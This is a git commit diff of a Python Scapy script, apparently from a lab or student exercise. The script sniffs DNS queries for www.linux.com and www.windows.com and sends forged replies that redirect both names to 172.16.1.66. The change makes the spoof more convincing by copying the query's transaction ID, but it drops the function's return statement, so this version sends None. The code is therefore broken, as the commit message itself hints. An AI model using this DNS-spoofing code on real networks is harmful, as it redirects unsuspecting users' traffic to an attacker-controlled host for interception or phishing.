043b9b258c5ceb481b68446119a7274eb6fe81ba
Étienne Gélinas-Gagnon <etiennegg7@hotmail.fr>
2016-09-06 18:12:56 -0400

    l'erreur semble etre corriger reste un nonetype

--- sniffer.py
+++ sniffer.py
@@ -1,24 +1,25 @@
 #!/usr/bin/python
 from scapy.all import *
 
-idDNS = 30000
+#idDNS = 30000
 
 def dnsMonitorCallBack(pkt):
     if pkt.haslayer(DNS):
         if pkt[DNS][DNSQR].qname == b'www.linux.com.':
             print("packet LINUX received")
-            send(NewPacket(pkt))
+            packet = NewPacket(pkt)
+            send(packet)
         if pkt[DNS][DNSQR].qname == b'www.windows.com.':
             print("packet WINDOWS received")
-            send(NewPacket(pkt))
+            packet = NewPacket(pkt)
+            send(packet)
 
 def NewPacket(pkt):
-    global idDNS
-    packet = IP(src=pkt[IP].dst, dst=pkt[IP].src) / \
-             UDP(sport=pkt[UDP].dport, dport=pkt[UDP].sport,len=201,chksum=0x4946) / \
-             DNS(id=idDNS,qr=1,rd=1,ra=1, qd=DNSQR(qname=pkt[DNS][DNSQR].qname,qtype="A",qclass="IN"), an=DNSRR(rrname=pkt[DNS][DNSQR].qname, type="A", rclass="IN", ttl=267, rdlen=4,rdata="172.16.1.66"))
+    #global idDNS
+    packet = IP(src="172.16.1.66", dst=pkt[IP].src) / \
+             UDP(sport=pkt[UDP].dport, dport=pkt[UDP].sport) / \
+             DNS(id=pkt[DNS].id,qr=1,rd=1,ra=1, qd=DNSQR(qname=pkt[DNS][DNSQR].qname,qtype=pkt[DNS][DNSQR].qtype,qclass=pkt[DNS][DNSQR].qclass), an=DNSRR(rrname=pkt[DNS][DNSQR].qname, type="A", rclass="IN", ttl=267, rdata="172.16.1.66"))
     packet.show()
-    idDNS += 1
-    return packet
+    #idDNS += 1
 
 sniff(prn=dnsMonitorCallBack)
